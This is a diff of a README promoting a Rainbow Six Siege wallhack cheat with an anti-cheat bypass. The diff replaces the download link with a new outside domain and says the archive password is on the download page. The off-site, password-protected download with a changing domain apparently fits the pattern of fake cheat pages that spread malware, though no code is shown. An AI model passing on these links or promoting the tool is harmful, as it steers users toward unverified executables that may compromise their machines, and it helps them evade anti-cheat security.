@@ -18,7 +18,7 @@ Rainbow Six Siege Wallhack - undetected cheat tool. Anti-cheat bypass included. 
 
 ## Download
 
-[![Download v2.2.0](https://img.shields.io/badge/Download_v2.2.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/r6wallhack)
+[![Download v2.2.0](https://img.shields.io/badge/Download_v2.2.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/r6wallhack)
 
 > The archive password is shown on the download page.
 
